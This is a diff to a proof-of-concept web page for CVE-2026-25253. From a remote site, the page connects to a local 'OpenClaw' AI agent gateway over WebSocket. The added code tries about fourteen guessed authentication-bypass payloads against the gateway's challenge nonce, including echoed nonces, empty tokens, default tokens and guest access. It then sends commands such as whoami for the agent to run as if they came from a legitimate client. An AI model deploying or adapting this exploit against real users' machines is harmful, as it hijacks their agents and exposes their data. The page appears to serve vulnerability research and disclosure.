@@ -19,7 +19,7 @@
     padding: 1rem;
     border-radius: 8px;
     margin: 0.5rem 0;
-    max-height: 200px;
+    max-height: 250px;
     overflow-y: auto;
     font-size: 0.8rem;
   }
@@ -41,6 +41,7 @@
   .vulnerable { background: #ff4d6a22; border: 2px solid #ff4d6a; color: #ff4d6a; }
   .safe { background: #44dd8822; border: 2px solid #44dd88; color: #44dd88; }
   .unknown { background: #ffaa3322; border: 2px solid #ffaa33; color: #ffaa33; }
+  .partial { background: #ffaa3322; border: 2px solid #ffaa33; color: #ffaa33; }
   .data-box {
     background: #1a1b2e;
     border: 1px solid #3a3b5a;
@@ -89,19 +90,19 @@
 
 <h1>CVE-2026-25253: WebSocket Exfiltration PoC</h1>
 <p class="info">Demonstrates that a remote webpage can connect to the local OpenClaw
-gateway and interact with the agent to extract data from the machine.</p>
+gateway and attempt to bypass the challenge-response authentication.</p>
 
 <div id="status" class="unknown">Connecting...</div>
 
 <div class="phase">
-  <h4>Phase 1: Protocol Discovery</h4>
-  <p style="font-size:0.8rem; color:#8888aa;">Auto-probing the gateway to discover its message format.</p>
-  <div class="log" id="probe-log"></div>
+  <h4>Phase 1: Connect + Challenge Response</h4>
+  <p style="font-size:0.8rem; color:#8888aa;">The gateway sends a challenge nonce. We try multiple response formats to authenticate.</p>
+  <div class="log" id="phase1-log"></div>
 </div>
 
 <div class="phase">
-  <h4>Phase 2: Interactive - Send Messages to the Agent</h4>
-  <p style="font-size:0.8rem; color:#8888aa;">Type a message or use a preset. The agent will execute it as if it came from a legitimate client.</p>
+  <h4>Phase 2: Interactive</h4>
+  <p style="font-size:0.8rem; color:#8888aa;">If authenticated, send commands. If not, use Raw JSON to try manual auth.</p>
 
   <div class="presets" id="presets">
     <button onclick="sendPreset('whoami')">whoami</button>
@@ -117,6 +118,13 @@ gateway and interact with the agent to extract data from the machine.</p>
            onkeydown="if(event.key==='Enter')sendCustom()">
     <button onclick="sendCustom()">Send</button>
   </div>
+
+  <p style="font-size:0.75rem; color:#8888aa; margin-top:0.5rem;">Raw JSON (send exact protocol messages):</p>
+  <div class="controls">
+    <input type="text" id="raw-input" placeholder='{"type":"connect.response","nonce":"...","token":"..."}'
+           onkeydown="if(event.key==='Enter')sendRaw()">
+    <button onclick="sendRaw()">Send Raw</button>
+  </div>
 </div>
 
 <h3>All Gateway Messages</h3>
@@ -127,14 +135,17 @@ gateway and interact with the agent to extract data from the machine.</p>
 
 <script>
 var logEl = document.getElementById('log');
-var probeLog = document.getElementById('probe-log');
+var phase1Log = document.getElementById('phase1-log');
 var dataBox = document.getElementById('data');
 var statusEl = document.getElementById('status');
 var msgInput = document.getElementById('msg-input');
+var rawInput = document.getElementById('raw-input');
 var GATEWAY = 'ws://127.0.0.1:18789';
 var ws = null;
 var msgCount = 0;
 var firstData = true;
+var authenticated = false;
+var challengeNonce = null;
 
 function addLog(el, msg, cls) {
   var p = document.createElement('p');
@@ -165,35 +176,86 @@ function trySend(msg) {
   }
 }
 
-// Phase 2: Send a chat message using discovered or guessed protocol formats
+// Attempt to respond to the challenge with various formats
+function tryChallenge(nonce, ts) {
+  challengeNonce = nonce;
+  addLog(phase1Log, 'Challenge received: nonce=' + nonce, 'warn');
+  addLog(phase1Log, 'Attempting challenge bypass...', 'info');
+
+  var attempts = [
+    // Echo nonce back directly
+    JSON.stringify({"type":"connect.response","nonce":nonce}),
+    // With empty/null token
+    JSON.stringify({"type":"connect.response","nonce":nonce,"token":""}),
+    JSON.stringify({"type":"connect.response","nonce":nonce,"token":null}),
+    // Auth with nonce as token
+    JSON.stringify({"type":"auth","nonce":nonce}),
+    JSON.stringify({"type":"auth","token":nonce}),
+    // Challenge response formats
+    JSON.stringify({"type":"connect.challenge.response","nonce":nonce,"ts":ts}),
+    JSON.stringify({"type":"challenge_response","nonce":nonce,"response":nonce}),
+    // Try anonymous/guest
+    JSON.stringify({"type":"connect.response","nonce":nonce,"auth":"anonymous"}),
+    JSON.stringify({"type":"connect.response","nonce":nonce,"device":"guest"}),
+    // Try with common default/placeholder tokens
+    JSON.stringify({"type":"connect.response","nonce":nonce,"token":"openclaw"}),
+    JSON.stringify({"type":"connect.response","nonce":nonce,"token":"default"}),
+    // Try skipping auth entirely with other message types
+    JSON.stringify({"type":"ping"}),
+    JSON.stringify({"type":"message","content":"test"}),
+    // Try HMAC-like (nonce as both challenge and response)
+    JSON.stringify({"type":"connect.response","payload":{"nonce":nonce,"signature":nonce}}),
+  ];
+
+  // Send them with small delays to see which one works
+  var i = 0;
+  function sendNext() {
+    if (i >= attempts.length) {
+      addLog(phase1Log, 'All ' + attempts.length + ' challenge responses sent.', 'info');
+      addLog(phase1Log, 'Waiting for gateway response...', 'info');
+      return;
+    }
+    var msg = attempts[i];
+    if (trySend(msg)) {
+      addLog(phase1Log, 'Try #' + (i+1) + ': ' + msg.substring(0, 80), 'sent');
+    }
+    i++;
+    setTimeout(sendNext, 100);
+  }
+  sendNext();
+}
+
 function sendAgentMessage(text) {
-  // Try multiple common gateway protocol formats
   var formats = [
-    JSON.stringify({"type": "user_message", "content": text}),
-    JSON.stringify({"type": "message", "role": "user", "content": text}),
-    JSON.stringify({"type": "chat", "message": text}),
-    JSON.stringify({"method": "sendMessage", "params": {"text": text}, "id": Date.now()}),
-    JSON.stringify({"action": "message", "data": {"text": text}}),
-    JSON.stringify({"event": "message", "payload": {"content": text}}),
+    JSON.stringify({"type":"user_message","content":text}),
+    JSON.stringify({"type":"message","role":"user","content":text}),
+    JSON.stringify({"type":"chat","message":text}),
+    JSON.stringify({"method":"sendMessage","params":{"text":text},"id":Date.now()}),
+    JSON.stringify({"action":"message","data":{"text":text}}),
   ];
 
   addData('SENT', text);
-  addLog(logEl, 'Sending message: ' + text, 'sent');
-
-  for (var i = 0; i < formats.length; i++) {
-    trySend(formats[i]);
-  }
+  addLog(logEl, 'Sending: ' + text, 'sent');
+  for (var j = 0; j < formats.length; j++) { trySend(formats[j]); }
 }
 
-function sendPreset(text) {
-  sendAgentMessage(text);
-}
+function sendPreset(text) { sendAgentMessage(text); }
 
 function sendCustom() {
   var text = msgInput.value.trim();
   if (!text) return;
   sendAgentMessage(text);
   msgInput.value = '';
+}
+
+function sendRaw() {
+  var text = rawInput.value.trim();
+  if (!text) return;
+  if (trySend(text)) {
+    addLog(logEl, 'Raw: ' + text.substring(0, 120), 'sent');
+    addData('RAW SENT', text);
+  }
+  rawInput.value = '';
 }
 
 function connect() {
@@ -210,7 +272,7 @@ function connect() {
   }
 
   var timeout = setTimeout(function() {
-    addLog(logEl, 'Timeout - gateway may not be running', 'warn');
+    addLog(logEl, 'Timeout', 'warn');
     statusEl.textContent = 'UNKNOWN - No response';
     statusEl.className = 'unknown';
     ws.close();
@@ -218,44 +280,46 @@ function connect() {
 
   ws.onopen = function() {
     clearTimeout(timeout);
-    statusEl.textContent = 'CONNECTED from ' + window.location.origin;
+    addLog(logEl, 'WebSocket OPEN from foreign origin', 'fail');
+    addLog(phase1Log, 'Connection accepted. Waiting for challenge...', 'fail');
+    statusEl.textContent = 'CONNECTED - Waiting for challenge...';
     statusEl.className = 'vulnerable';
-    addLog(logEl, 'Connected!', 'fail');
-
-    // Phase 1: Auto-probe to discover protocol
-    addLog(probeLog, 'Starting protocol discovery...', 'info');
-
-    var probes = [
-      '{"type":"ping"}',
-      '{"method":"ping","id":1}',
-      '{"type":"hello"}',
-      '{"type":"auth","token":"probe"}',
-      '{"method":"getStatus","id":2}',
-      '{"method":"listConversations","id":3}',
-      '{"type":"subscribe","channel":"*"}',
-      'ping',
-    ];
-
-    for (var i = 0; i < probes.length; i++) {
-      if (trySend(probes[i])) {
-        addLog(probeLog, 'Probe: ' + probes[i], 'sent');
-      }
-    }
-
-    addLog(probeLog, 'Probes sent. Waiting for responses...', 'info');
   };
 
   ws.onmessage = function(event) {
-    var text = typeof event.data === 'string' ? event.data : '[binary: ' + event.data.size + ' bytes]';
-    addLog(logEl, 'RECEIVED: ' + text.substring(0, 200), 'recv');
+    var text = typeof event.data === 'string' ? event.data : '[binary]';
+    addLog(logEl, 'RECV: ' + text.substring(0, 200), 'recv');
     addData('RECEIVED', text);
 
-    // Try to pretty-print JSON
     try {
-      var parsed = JSON.parse(text);
-      addLog(probeLog, 'Response type: ' + (parsed.type || parsed.method || parsed.event || 'unknown'), 'recv');
+      var msg = JSON.parse(text);
+
+      // Handle challenge
+      if (msg.event === 'connect.challenge' || (msg.type === 'event' && msg.event === 'connect.challenge')) {
+        var nonce = msg.payload ? msg.payload.nonce : msg.nonce;
+        var ts = msg.payload ? msg.payload.ts : msg.ts;
+        tryChallenge(nonce, ts);
+        return;
+      }
+
+      // If we get any non-challenge response, we may be authenticated
+      if (msg.event !== 'connect.challenge') {
+        addLog(phase1Log, 'Got response: ' + (msg.type || msg.event || msg.method || JSON.stringify(msg).substring(0, 80)), 'recv');
+
+        // Check for auth success indicators
+        if (msg.event === 'connect.success' || msg.type === 'authenticated' || msg.type === 'welcome' || msg.type === 'ready') {
+          authenticated = true;
+          addLog(phase1Log, 'AUTHENTICATED! Full access to agent.', 'fail');
+          statusEl.textContent = 'FULLY COMPROMISED - Authenticated from ' + window.location.origin;
+        }
+
+        // Check for error/rejection
+        if (msg.type === 'error' || msg.event === 'error') {
+          addLog(phase1Log, 'Auth rejected: ' + (msg.message || msg.payload || JSON.stringify(msg)), 'warn');
+        }
+      }
     } catch (e) {
-      addLog(probeLog, 'Non-JSON response: ' + text.substring(0, 100), 'recv');
+      addLog(phase1Log, 'Non-JSON: ' + text.substring(0, 100), 'info');
     }
   };
 
@@ -264,14 +328,19 @@ function connect() {
     addLog(logEl, 'Connection failed', 'ok');
     statusEl.textContent = 'SAFE - Connection rejected';
     statusEl.className = 'safe';
-    dataBox.textContent = 'No connection established.';
+    dataBox.textContent = 'No connection.';
   };
 
   ws.onclose = function(e) {
     clearTimeout(timeout);
     addLog(logEl, 'Disconnected (code: ' + e.code + ')', 'warn');
-    if (statusEl.className.indexOf('vulnerable') !== -1) {
-      statusEl.textContent += ' (disconnected)';
+
+    if (e.code === 1008) {
+      addLog(phase1Log, 'Gateway closed with 1008 (Policy Violation) - challenge failed', 'warn');
+      if (!authenticated) {
+        statusEl.textContent = 'PARTIAL VULN - Connection accepted, auth challenge blocked further access';
+        statusEl.className = 'partial';
+      }
     }
   };
 }
